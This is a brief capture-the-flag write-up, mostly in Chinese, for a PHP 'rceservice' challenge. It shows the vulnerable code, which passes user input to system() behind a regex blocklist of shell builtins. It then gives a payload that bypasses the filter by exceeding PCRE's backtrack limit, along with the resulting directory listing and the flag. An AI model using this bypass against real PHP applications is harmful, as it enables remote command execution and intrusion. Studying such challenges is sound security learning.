# rceservice

```php
<?php

putenv('PATH=/home/rceservice/jail');

if (isset($_REQUEST['cmd'])) {
  $json = $_REQUEST['cmd'];

  if (!is_string($json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
    echo 'Hacking attempt detected<br/><br/>';
  } else {
    echo 'Attempting to run command:<br/>';
    $cmd = json_decode($json, true)['cmd'];
    if ($cmd !== NULL) {
      system($cmd);
    } else {
      echo 'Invalid input';
    }
    echo '<br/><br/>';
  }
}

?>
```

這題題目很短，用`preg_match`擋了一堆東西

但我們知道PHP有pcre backtrace limit限制，當回溯超過1000000次時，會回傳false

在弱比較下等同匹配成功，就成功繞過惹

e.g.

`'{"cmd":"ls -al /","zz":"' + "a"*(1000000) + '"}'`

=>

```
drwxr-xr-x 1 root root       4096 May 26 21:20 ..
-r--r--r-- 1 root rceservice   43 May 23 03:58 flag
dr-xr-xr-x 1 root rceservice 4096 May 26 21:20 jail
```

Bypass successfully!


詳細 payload 見exp.py

flag: `fb{pr3g_M@tcH_m@K3s_m3_w@Nt_t0_cry!!1!!1!}`
